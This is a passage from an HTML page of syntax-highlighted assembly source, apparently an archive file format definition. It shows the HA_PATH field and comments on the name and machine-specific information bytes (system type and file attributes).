</span><span class="sc5">HA_PATH</span><span class="sc0">     </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;11 (ZERO IF ISN'T PRESENT) NOTE: ALL</span><span class="sc0">
                    </span><span class="sc1">;DIRPATHS SEPARATED BY 0xFF CODE</span><span class="sc0">
        </span><span class="sc9">ENDS</span><span class="sc0">            </span><span class="sc1">;12</span><span class="sc0">

</span><span class="sc1">;+N 0</span><span class="sc0">
</span><span class="sc1">;+1 NAME</span><span class="sc0">
</span><span class="sc1">;+N 0</span><span class="sc0">
</span><span class="sc1">;+1 LENGTH OF MACHINE SPECIFIC INFORMATION (02H)</span><span class="sc0">
</span><span class="sc1">;+1 MACHINE SPECIFIC INFORMATION:</span><span class="sc0">
</span><span class="sc1">;   +0 SYSTEM TYPE (0-DOS,1-LINUX,[DEFAULT=1])</span><span class="sc0">
</span><span class="sc1">;   +1 FILE ATTRIBUTES (BYTE)</span><span class="sc0">
</span></div></body>
</html>
